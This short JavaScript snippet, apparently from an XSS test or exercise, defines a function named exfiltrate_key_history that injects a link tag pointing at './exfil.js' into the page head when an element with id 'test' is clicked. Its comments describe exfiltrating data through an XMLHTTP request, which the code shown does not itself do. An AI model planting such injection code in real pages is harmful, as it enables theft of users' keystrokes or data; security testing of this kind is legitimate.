function exfiltrate_key_history() {

    // XSS 4 - Link Tag + Shortcut URL - No Obfuscation
    // Exfiltrate data using XMLHTTP request
    var script = document.createElement("link");
    script.rel = 'stylesheet';
	script.href = './exfil.js';
	document.getElementsByTagName('head')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
